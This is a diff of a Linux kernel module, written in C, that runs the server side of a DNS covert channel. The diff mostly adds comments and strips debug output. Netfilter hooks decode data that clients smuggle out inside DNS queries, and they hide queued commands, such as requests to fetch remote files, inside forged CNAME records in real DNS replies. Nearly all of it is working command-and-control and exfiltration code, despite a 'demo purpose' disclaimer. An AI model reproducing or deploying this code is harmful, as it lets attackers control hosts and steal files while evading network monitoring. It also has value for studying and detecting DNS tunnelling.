@@ -4,6 +4,10 @@
  * Kernel module for dns covert channel  / server side
  * This module should be loaded on the controlled host, which has the recursive dns
  *
+ * Disclaimer: This code is made for demo purpose.
+ * Please consider this, before complaining about unoptimized calls/functions, random printks, etc
+ * The module was developed using linux-image-3.2.0
+ * 
  * Copyright (C) 2013 by Tamas Varga
  *
  */
@@ -29,13 +33,13 @@
 #include "messages/dnscc_msg.h"
 #include "messages/get_file_msg.h"
 #include "lib/modp_b64w.c"
-/* */
 /* Def */
 #define UDP_HDR_LEN 8
 #define DNS_PORT 53
 #define NETLINK_USER 31
-/* statics */
+/* Structs */
 static struct nf_hook_ops nfho_send,nfho_recv;
+/* DNS header */
 struct DNS_HEADER {
 	uint16_t	query_id;
 	uint16_t	flags;
@@ -60,7 +64,7 @@ struct RR
 	unsigned char	*rdata;
 };
 
-//Struct align with fake bytes ...
+//Struct align with fake bytes, that's why #pragma is needed here
 #pragma pack(push,1)
 struct RR_DATA{
 	uint16_t	type;
@@ -69,14 +73,7 @@ struct RR_DATA{
 	uint16_t	rdlength;
 };
 #pragma pack(pop)
-/* List for filtering outgoing dns reply packets */ 
-/* Sending command with the cli client
- * 1, CLI sends a netlink message to kernel module
- * 2, Validate message, and make a connection enrty in conn_out_list
- * 3, Every outgoing dns client response will be matched against conn_out_list
- * 4, After match found, the original packet will be replaced with a fake CNAME dns reply
- * 5, Client will query that fake CNAME, then we send out the original reply
- */
+/* List and struct for filtering outgoing dns reply packets */ 
 struct conn_out_data{
 	uint32_t ip_addr;
 	uint16_t stage;//see #define
@@ -86,11 +83,11 @@ struct conn_out_data{
 
 struct conn_out_data conn_out_list;
 
-/* Struct for identifying a connection in the linked list */
+/* Struct for storing incoming dns channels */
 struct conn_in_data{
 	uint32_t ip_addr;
 	uint32_t connection_id;
-	unsigned char buff[1024];
+	unsigned char buff[1024]; // Be carefull, when sending data bigger that 1024 from client side!
 	uint16_t count;
 	struct list_head list;
 };
@@ -122,13 +119,12 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 				netlink_pid = nlh->nlmsg_pid;
 				get_file_msg* gfmsg = msg->data;
 				rf_len = strlen((const char*)gfmsg->remote_file)+1;
-				printk(KERN_INFO"remote file length %d",rf_len);
 				enc_command = (unsigned char*)kmalloc(sizeof(unsigned char)*(rf_len+256),GFP_DMA);
 				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
 				strcat(command,gfmsg->remote_file);
-				printk(KERN_INFO"Command %s",command);
+				/* Make a new command entry, so dns_send hook can hide the 
+				 * command in outgoing dns packets */
 				len = modp_b64w_encode(enc_command,command,rf_len+3);
-				printk(KERN_INFO"enc command %s %d len",enc_command,len);
 				c = kmalloc(sizeof(*c), GFP_DMA);
 				c->ip_addr = gfmsg->ip.s_addr;
 				c->command = enc_command;
@@ -145,7 +141,7 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 /* Connection helpers */
 /* Generate an unique connection identifier using the source IP, and the source port
  * and store it in the connection_list 
- * TODO: is there any chance of generating NULL as unique id?
+ * Q1: is there any chance of generating NULL as unique id?
  */
 struct conn_in_data* generate_connection_id(uint32_t ip_addr, uint16_t sport,uint8_t data){
 	struct conn_in_data* c;
@@ -161,6 +157,7 @@ struct conn_in_data* generate_connection_id(uint32_t ip_addr, uint16_t sport,uin
 	return c;
 }
 
+/* Store incoming 8 bit data chunk */
 struct conn_in_data* add_connection_data(struct conn_in_data* c,uint8_t data){
 	if(c != NULL){
 	//	printk(KERN_DEBUG "[DNSCC] Match found! Adding connection data to %u -> %x", c->connection_id,data);
@@ -187,7 +184,8 @@ struct conn_in_data* check_connection_exists(uint32_t ip_addr){
 	return NULL;
 }
 
-/* Remove the connection from linked list and return the connection id*/
+/* Remove the connection from linked list and return the connection id
+ * Also send back the data to the userspace program using netlink sockets*/
 uint32_t remove_connection(uint32_t ip_addr){
 	uint32_t ret;
 	struct conn_in_data *c,*temp;
@@ -223,7 +221,7 @@ uint32_t remove_connection(uint32_t ip_addr){
 }
 
 /* Out conn helpers */
-/* Check if we need to send command to this ip 
+/* Do we have a command for this client? 
  * if yes, return 1, else 0
  * */
 uint16_t check_command_exists(uint32_t ip_addr){
@@ -265,7 +263,8 @@ uint8_t remove_command(uint32_t ip_addr){
 	}
 	return 0;
 }
-//correct name pointers
+/* Correct name pointer */
+/* Note, this function is not used in the latest version, however it is working according to my latest tests */
 unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int* count, uint16_t ptr_offset, uint16_t ar_start)
 {
 	unsigned int jumped=0,offset;
@@ -310,8 +309,8 @@ unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int
 	return "ok";
 }
 
-//TODO:Removeme static const uint16_t port = 53;
-// source : http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
+/* Convert dns name to human readable format */
+// source http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
 unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* count)
 {
 	unsigned char *name;
@@ -352,13 +351,12 @@ unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* 
 	}
 	name[i-1]='\0'; //remove the last dot
 	
-	//TODO:debug 
 	//printk(KERN_DEBUG"[DNSCC] Read dns name %s",name);
 	return name;
 }
 
-/* we do not want to inser a command between domain.tld and A record so return 0 if we find only 1 dot in the question */
-
+/* Check if we can inject a fake cname */
+/* we do not want to insert a command between domain.tld and A record so return 0 if we find only 1 dot in the question */
 uint8_t can_manipulate_dns_reply(unsigned char* dns_name){
 	int i;
 	int dot_found = 0;
@@ -375,8 +373,9 @@ uint8_t can_manipulate_dns_reply(unsigned char* dns_name){
 
 }
 
-/* Insert a fake cname betweek question_domain <-> A record */
+/* Insert a fake cname between question_domain <-> A record */
 uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsigned char* new_dns_data,uint16_t orig_len){
+	/* I think, the number of these variables can be reduced ... */
 	struct DNS_HEADER *dns_h,*ndns_h;
 	unsigned char *qname, *nqname;
 	unsigned char* dns_name;
@@ -394,7 +393,11 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	struct RR fake_rr;
 	int com_len;
 	int last_dot;
-
+	/* Basically, we will read the original packet
+	 * till the first answer. Then, we'll try to find the ipv4 address for, and inject an
+	 * question CNAME fakecommand.question
+	 * fakecommand.question A orig_IPV4
+	 */
 
 
 	temp =0;
@@ -421,7 +424,6 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 				ar[i].rdata[j] = dpointer[j];
 				printk(KERN_INFO" ar data %x ",ar[i].rdata[j]);
 			}	
-//	                ar[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';
 			ip_ar_num = i;	
 		}
 		old_aur_start += ntohs(ar[i].rr_data->rdlength);
@@ -435,7 +437,6 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	fake_rr.name = kmalloc(sizeof(unsigned char)*2,GFP_DMA);
 	fake_rr.name[0] = 0xc0;
 	fake_rr.name[1] = 0x0c;
-	printk(KERN_INFO"fake comm %x - %x",ntohs(fake_rr.name[0]),ntohs(fake_rr.name[1]));
 	fake_rr.rr_data = kmalloc(sizeof(struct RR_DATA),GFP_DMA);
 	fake_rr.rr_data->type = htons(5);//cname
 	fake_rr.rr_data->class = htons(1);
@@ -510,7 +511,9 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 //	printk(KERN_INFO "Pointer correct %d writer: %d aur_old_start: %d",pointer_correct,writer,old_aur_start);
 
 	/* copy other stuff */
-/*
+	/* There are no checks for dns packet size, so we're just going to skip this part.
+	 * But it should work */
+	/*
 	memcpy(&new_dns_data[writer],dpointer,orig_len-old_aur_start);
 	printk(KERN_INFO" copyed %d data writer now %d ",orig_len-old_aur_start,writer);
 	//riter += orig_len-old_aur_start;
@@ -555,7 +558,9 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 }
 
 
-/*Receiver hook */
+/*Receiver hook 
+ *This is where we check the incoming packets, and try to identify and decode incoming dns covert channels 
+ * */
 static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const struct net_device* in, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
 	struct iphdr* iph = ip_hdr(skb);
 	struct udphdr* udph = NULL, udpbuff;
@@ -610,7 +615,6 @@ static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const 
 			c = check_connection_exists(iph->saddr);
 			if(c != NULL){
 				memcpy(&local_b,c->buff,strlen((const char*)c->buff));
-//				printk(KERN_INFO"[DNSCC]  %s ",local_b);
 				connection_id = remove_connection(iph->saddr);
 			}
 		}else{
@@ -626,7 +630,9 @@ static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const 
 }
 
 
-/* Sender hook */
+/* Sender hook 
+ * Check the dstIpv4 for ever outgoing dns packet, and if we can find a command, then manipulate the dns reply
+ * */
 static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const struct net_device* on, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
 	struct iphdr* iph = ip_hdr(skb);
 	struct udphdr* udph = NULL;
@@ -662,7 +668,6 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	        question_data = (struct QUESTION*)&data[sizeof(struct DNS_HEADER)+dnsn_count+1];	
 		printk(KERN_INFO "[DNSCC] Outgoing DNS answer packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
 		/* check if we need to send out a command to this client and the reply is an A record*/
-//		printk(KERN_INFO"Check command %d qtype %d",check_command_exists(iph->daddr),ntohs(question_data->qtype==1));
 		if(check_command_exists(iph->daddr) == 1 && ntohs(question_data->qtype == 1) && can_manipulate_dns_reply(dns_name) == 1){
 			/* Manipulate the answer */
 			unsigned char *command;
@@ -677,7 +682,6 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			command = get_command(iph->daddr);
 			new_dns_size = sizeof(unsigned char)*payload_len + strlen((const char*)command+20) ;
 			new_dns_data = kmalloc(new_dns_size,GFP_DMA);
-			printk(KERN_INFO "1new dns size: %d ",new_dns_size);
 			orig_dns_data = kmalloc(sizeof(unsigned char)*payload_len,GFP_DMA);
 			skb_copy_bits(skb,skb->len - payload_len,orig_dns_data,payload_len); // copy data from skb
 			/* new skb */
